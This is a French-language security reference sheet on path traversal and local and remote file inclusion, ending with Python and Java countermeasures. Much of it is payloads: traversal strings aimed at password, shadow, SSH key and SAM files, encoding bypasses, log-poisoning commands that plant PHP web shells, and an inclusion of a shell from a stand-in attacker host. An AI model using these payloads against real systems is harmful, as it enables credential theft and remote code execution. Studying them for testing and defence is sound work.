---
title: Path Traversal
domain: sciences-appliquées
subdomain: informatique / sécurité / web
tags: [path-traversal, lfi, directory-traversal, web, sécurité]
date: 2026-03-22
---

# Path Traversal

Le path traversal (traversée de répertoire) exploite l'utilisation de chemins de fichiers contrôlés par l'utilisateur pour accéder à des fichiers en dehors du répertoire prévu. La séquence `../` remonte d'un niveau dans l'arborescence.

## Principe

```
Application : GET /download?file=rapport.pdf
Code serveur : open("/var/www/uploads/" + filename)

Attaque : GET /download?file=../../../etc/passwd
Résultat : open("/var/www/uploads/../../../etc/passwd")
         = open("/etc/passwd") → lecture du fichier système
```

## Payloads de base

```bash
# Linux — fichiers cibles courants
../../../etc/passwd
../../../etc/shadow          # Si accessible (nécessite root)
../../../etc/hosts
../../../etc/crontab
../../../proc/self/environ   # Variables d'environnement du processus
../../../proc/self/cmdline   # Ligne de commande du processus
../../../proc/self/fd/0      # stdin
../../../var/log/apache2/access.log
../../../var/log/nginx/access.log
../../../home/<user>/.ssh/id_rsa
../../../root/.bash_history

# Windows — fichiers cibles
..\..\..\Windows\win.ini
..\..\..\Windows\System32\drivers\etc\hosts
..\..\..\Windows\System32\config\SAM   # Hashes (si accessible)
..\..\..\inetpub\wwwroot\web.config    # Configuration IIS
..\..\..\boot.ini
```

## Techniques de bypass

### Encodage URL

```bash
# Encodage simple
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Double encodage (si le serveur décode deux fois)
..%252F..%252F..%252Fetc%252Fpasswd   # %25 = % → %252F → %2F → /

# Encodage Unicode
..%c0%af..%c0%afetc%c0%afpasswd      # %c0%af = / en overlong UTF-8
..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd  # ／ fullwidth solidus U+FF0F
```

### Contournement de filtres

```bash
# Si le filtre supprime "../" → utiliser des traversées imbriquées
....//....//....//etc/passwd         # ....// → après suppression de ../ → ../
..././..././..././etc/passwd         # .././ → ../ après suppression de ./

# Si le filtre vérifie que le chemin commence par le bon répertoire
# mais pas la fin :
/var/www/uploads/../../../etc/passwd

# Null byte (PHP < 5.3.4 — tronque la chaîne au \0)
../../../etc/passwd%00.pdf           # .pdf ajouté par le code → tronqué au %00

# Slash alternatifs (Windows)
..\..\..\etc\passwd
..%5C..%5C..%5Cetc%5Cpasswd         # %5C = \
```

### Chemins absolus

```bash
# Si le code concatène sans vérification de chemin :
# open(base_dir + user_input) où user_input commence par /
/etc/passwd                          # Chemin absolu direct
/../../../../etc/passwd              # Absolu + traversal
```

### Contournement de strip

```python
# Si le code fait : filename = filename.replace("../", "")
# "....//etc/passwd" → après replace("../", "") → "../etc/passwd" → encore vulnérable

# Ou : filename = filename.replace("..", "")
# Résidu : .../etc/passwd → pas de / → inoffensif ?
# Mais : "..././etc/passwd" → après replace("..", "") → "./etc/passwd" (traversal minimal)
```

## LFI (Local File Inclusion) — exécution de code

Quand le serveur inclut le fichier comme du code (PHP `include`, `require`) au lieu de simplement le lire.

```php
// Code vulnérable
include($_GET['page'] . '.php');

// LFI → lire un fichier PHP existant
?page=../../../var/log/apache2/access

// LFI → Log Poisoning (injection + inclusion du log)
// 1. Injecter du code PHP dans le User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" https://target.com/
// 2. Inclure le log qui contient le code injecté
?page=../../../var/log/apache2/access&cmd=id

// Inclure via wrappers PHP
?page=php://filter/convert.base64-encode/resource=index
// → affiche le source PHP en base64 → décoder pour lire le code

?page=php://input avec POST body : <?php system('id'); ?>
// → exécute le code envoyé dans le body POST

?page=data://text/plain,<?php system('id'); ?>
// → exécute du code inline (si allow_url_include=On)

?page=expect://id
// → exécute la commande id (si extension expect activée)
```

### Log Poisoning — autres vecteurs

```bash
# Empoisonner /var/log/auth.log via SSH
ssh "<?php system(\$_GET['cmd']); ?>"@target.com
# Une tentative de connexion avec ce "username" est logguée
# LFI vers auth.log + paramètre cmd → RCE

# Empoisonner /proc/self/environ via User-Agent
# /proc/self/environ contient les variables d'env du processus web
# Si User-Agent est dans l'environnement et que LFI peut y accéder
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" https://target.com/
?page=../../../proc/self/environ&cmd=id
```

## RFI (Remote File Inclusion)

Si `allow_url_include = On` en PHP (rare en production), on peut inclure des fichiers distants.

```php
// Code vulnérable
include($_GET['page']);

// RFI — inclure un fichier hébergé par l'attaquant
?page=http://attaquant.com/shell.php
?page=ftp://attaquant.com/shell.php
?page=\\attaquant.com\share\shell.php  // Windows UNC path
```

## Fichiers intéressants sur Linux

```bash
# Credentials et configuration
/etc/passwd             # Utilisateurs système
/etc/shadow             # Hashes des mots de passe (root requis)
/etc/mysql/my.cnf       # Config MySQL avec credentials
/var/www/html/.env      # Variables d'environnement (Laravel, Django...)
/var/www/html/config.php

# Clés et certificats
/home/<user>/.ssh/id_rsa
/root/.ssh/id_rsa
/etc/ssl/private/       # Clés privées TLS

# Logs (pour log poisoning)
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/auth.log
/var/log/mail.log

# Informations système (via /proc)
/proc/self/environ      # Variables d'environnement
/proc/self/cmdline      # Ligne de commande du processus
/proc/net/tcp           # Connexions TCP
/proc/<pid>/exe         # Binaire du processus (symlink)
```

## Détection et outils

```bash
# Fuzzing avec ffuf
ffuf -u "https://target.com/download?file=FUZZ" \
    -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
    -mc 200 -fs <taille_normale>

# Burp Intruder — tester des payloads de traversal
# Liste : SecLists/Fuzzing/LFI/

# dotdotpwn — fuzzer dédié au path traversal
dotdotpwn -m http -h target.com -U "/download?file=TRAVERSAL" -e /etc/passwd

# LFISuite
python lfisuite.py
```

## Contre-mesures

```python
# Python — validation stricte du chemin résolu
import os

def safe_file_path(base_dir, user_input):
    # Résoudre le chemin absolu réel
    base = os.path.realpath(base_dir)
    requested = os.path.realpath(os.path.join(base, user_input))

    # Vérifier que le chemin résolu est toujours dans le répertoire de base
    if not requested.startswith(base + os.sep):
        raise ValueError(f"Path traversal détecté: {user_input}")

    return requested

# Utilisation
try:
    path = safe_file_path("/var/www/uploads", filename)
    with open(path, 'rb') as f:
        return f.read()
except ValueError:
    return "Fichier non autorisé", 403
```

```java
// Java — realpath pour résoudre les traversals
Path base = Paths.get("/var/www/uploads").toRealPath();
Path resolved = base.resolve(filename).normalize().toRealPath();

if (!resolved.startsWith(base)) {
    throw new SecurityException("Path traversal detected");
}
```

```
Bonnes pratiques :
✓ Résoudre le chemin absolu (realpath) avant toute vérification
✓ Comparer le chemin résolu au répertoire de base autorisé
✓ Ne jamais concaténer directement des entrées utilisateur dans des chemins
✓ Utiliser une whitelist de noms de fichiers autorisés si possible
✓ Sur Linux : chroot ou namespaces pour limiter l'accès au filesystem
✓ PHP : désactiver allow_url_include et allow_url_fopen si pas nécessaire
```
